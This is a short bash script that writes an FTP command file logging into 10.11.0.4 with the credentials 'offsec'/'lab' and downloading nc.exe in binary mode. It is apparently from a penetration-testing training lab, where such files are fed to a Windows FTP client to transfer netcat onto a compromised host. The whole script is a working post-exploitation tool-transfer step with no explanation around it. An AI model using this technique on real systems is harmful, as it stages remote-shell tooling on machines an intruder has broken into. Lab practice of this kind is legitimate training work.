#!/bin/bash

echo open 10.11.0.4 21 > ftp.txt
echo USER offsec >> ftp.txt
echo lab >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
